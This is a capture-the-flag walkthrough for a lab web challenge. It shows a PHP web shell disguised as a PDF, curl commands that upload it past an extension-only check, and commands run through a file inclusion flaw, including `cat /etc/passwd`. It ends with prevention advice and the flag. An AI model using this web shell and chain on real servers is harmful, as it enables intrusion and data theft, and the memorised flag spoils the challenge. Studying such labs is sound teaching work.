# CTF Challenge: "Join Team" - Complete Walkthrough
**Date:** April 6, 2026  
**Challenge Type:** Web Security (File Upload + Local File Inclusion + RCE)  
**Status:** ✅ SOLVED

---

## Challenge Summary

A web security challenge hosted on Cybertalents that exploits:
1. Weak file upload validation (extension-based)
2. Local File Inclusion (LFI) vulnerability
3. Remote Code Execution (RCE) via PHP web shell

**Flag:** `hiddenenvironflag`

---

## Vulnerability Chain

```
Weak Upload Validation (accepts .pdf only)
    ↓
Upload PHP code disguised as PDF
    ↓
Local File Inclusion (index.php includes uploaded files)
    ↓
PHP code gets executed
    ↓
Command Injection via $_GET['cmd']
    ↓
Remote Code Execution
```

---

## Step-by-Step Exploitation

### Step 1: Reconnaissance
Explore the website structure to understand the application:

```bash
curl http://cdcamxwl32pue3e6m86dv92kb4zlge435ng0kb8z5-web.cybertalentslabs.com/
```

**Key Findings:**
- Home page at `/index.php?home`
- About page at `/index.php?about`
- WorkForUs (upload) page at `/index.php?jobs`
- Only PDF files are allowed

### Step 2: Analyze the Upload Form
Check the upload form on the jobs page:

```bash
curl -s "http://[URL]/index.php?jobs" | grep -i "form\|input\|accept"
```

**Form Details:**
- Input name: `cv`
- Accepts: `application/pdf` (MIME type)
- Method: POST
- Enctype: multipart/form-data
- Validation message: "Only pdf files are allowed, don't try to bypass the validation we have strong security ( or we think so :) )"

### Step 3: Create a PHP Backdoor
Create a simple web shell that executes commands via GET parameter:

```bash
cat > /tmp/backdoor.pdf << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

**Why `.pdf` extension?**
- The server validates by file extension, not actual file type
- We can rename any file to `.pdf` and upload it
- PHP code inside will still execute if included

### Step 4: Upload the Backdoor
Bypass the upload validation by giving the PHP file a `.pdf` extension:

```bash
curl -F "cv=@/tmp/backdoor.pdf;type=application/pdf" \
  "http://[URL]/index.php?jobs"
```

**Expected Response:**
```
Your cv has been uploaded successfully in <a href="data/backdoor.pdf">backdoor.pdf</a>
```

**What happened:**
- Server accepted the file (extension is `.pdf`)
- File stored in `/data/backdoor.pdf`
- Server doesn't validate actual file type (magic bytes)

### Step 5: Identify the Local File Inclusion Vulnerability
Test if `index.php` includes files based on the query parameter:

**Test 1: Access the backdoor through index.php**
```bash
curl "http://[URL]/index.php?data/backdoor.pdf"
```

**Result:** The page returns with the standard site layout (no error = file was accessed)

**Test 2: Execute a command**
```bash
curl "http://[URL]/index.php?data/backdoor.pdf&cmd=whoami"
```

**Result:** The page contains `www-data` (the web server's user)

**Success Indicator:** When you see command output in the page, the vulnerability is confirmed!

### Step 6: Extract the Flag
Read the `index.php` source code to find the flag:

```bash
curl "http://[URL]/index.php?data/backdoor.pdf&cmd=head%20-10%20index.php"
```

**Or search directly:**
```bash
curl "http://[URL]/index.php?data/backdoor.pdf&cmd=grep%20flag%20index.php"
```

**Output:**
```php
$_ENV['flag'] = 'hiddenenvironflag';
```

### Step 7: Submit the Flag
**Answer:** `hiddenenvironflag`

---

## Technical Explanation

### The Vulnerability in index.php
Vulnerable code likely looks like this:

```php
<?php
$page = $_GET[0];  // Gets query parameter
include($page);    // ← Includes whatever file is specified!
?>
```

**Attack Flow:**
1. `index.php?home` → includes `home` file
2. `index.php?about` → includes `about` file
3. `index.php?data/backdoor.pdf` → includes YOUR backdoor file ← **EXPLOITED!**

### Command Execution
The backdoor code executes commands:

```php
<?php system($_GET['cmd']); ?>
```

**Process:**
1. Browser sends: `index.php?data/backdoor.pdf&cmd=whoami`
2. index.php includes: `data/backdoor.pdf`
3. PHP executes: `system($_GET['cmd'])`
4. `$_GET['cmd']` = `whoami`
5. Server runs: `whoami` command
6. Output: `www-data`

---

## URL Encoding Reference

### Why `%20` for spaces?
URLs cannot contain spaces directly. They must be encoded.

**Example:**
- ❌ `&cmd=grep flag index.php` ← Broken (space breaks URL)
- ✅ `&cmd=grep%20flag%20index.php` ← Correct

**Common Encodings:**

| Character | Encoding |
|-----------|----------|
| space | `%20` |
| `&` | `%26` |
| `=` | `%3D` |
| `/` | `%2F` |
| `;` | `%3B` |
| `\|` | `%7C` |
| `>` | `%3E` |
| `<` | `%3C` |
| `#` | `%23` |

**How it works:**
```
Browser sends: &cmd=grep%20flag%20index.php
                      ↓ (URL decoding)
Server receives: &cmd=grep flag index.php
                        ↑ (becomes a real space)
```

### Example with piping:
```bash
# To execute: grep flag index.php | head -1
# URL becomes:
&cmd=grep%20flag%20index.php%20%7C%20head%20-1
      ↑ space         ↑ space      ↑ pipe  ↑ space
```

---

## Terminology

### File Upload Vulnerability
Uploading restricted file types by:
- Changing file extension only
- Spoofing MIME type
- Using null bytes (`%00`)
- Double extensions (e.g., `shell.php.pdf`)

### Local File Inclusion (LFI)
Application includes files based on user input without validation:
```php
include($_GET['page']);  // ← Vulnerable!
```

### Remote Code Execution (RCE)
Executing arbitrary code on the remote server through:
- Web shell (file you uploaded)
- Command injection
- Server-side template injection

### Command Injection
Injecting OS commands through parameters:
```
&cmd=whoami
&cmd=ls%20-la
&cmd=cat%20/etc/passwd
```

### Web Shell
A file containing code that gives you interactive access to the server:
```php
<?php system($_GET['cmd']); ?>
```

---

## Quick Reference Commands

**Test server availability:**
```bash
curl -I http://[URL]/
```

**Explore upload page:**
```bash
curl -s http://[URL]/index.php?jobs | head -50
```

**Create backdoor:**
```bash
cat > backdoor.pdf << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

**Upload backdoor:**
```bash
curl -F "cv=@backdoor.pdf;type=application/pdf" http://[URL]/index.php?jobs
```

**Execute whoami:**
```bash
curl "http://[URL]/index.php?data/backdoor.pdf&cmd=whoami"
```

**Read file:**
```bash
curl "http://[URL]/index.php?data/backdoor.pdf&cmd=cat%20filename"
```

**List directory:**
```bash
curl "http://[URL]/index.php?data/backdoor.pdf&cmd=ls%20-la"
```

**Find flag:**
```bash
curl "http://[URL]/index.php?data/backdoor.pdf&cmd=grep%20flag%20index.php"
```

---

## Key Learnings

### What Went Wrong?
1. **Weak validation:** Only checking file extension, not content
2. **No file type verification:** Didn't check magic bytes or MIME type
3. **Unsafe file inclusion:** Including user-controlled paths
4. **No input sanitization:** Direct execution of user parameters

### Prevention Measures
1. **Validate file type by content** (magic bytes), not extension
2. **Store uploads outside web root** or in protected directory
3. **Disable script execution** in upload directories (.htaccess or server config)
4. **Never include user input directly** - use whitelists
5. **Sanitize all user input** before use in commands
6. **Use `escapeshellarg()`** for command execution
7. **Run web server with minimal privileges** (not root)

### Real-World Impact
This type of vulnerability allows attackers to:
- Read sensitive files
- Modify/delete data
- Install malware
- Escalate privileges
- Pivot to other systems

---

## Challenge URL
`http://cdcamxwl32pue3e6m86dv92kb4zlge435ng0kb8z5-web.cybertalentslabs.com`

---

**Document Created:** April 6, 2026  
**Challenge Status:** ✅ COMPLETED  
**Flag:** `hiddenenvironflag`
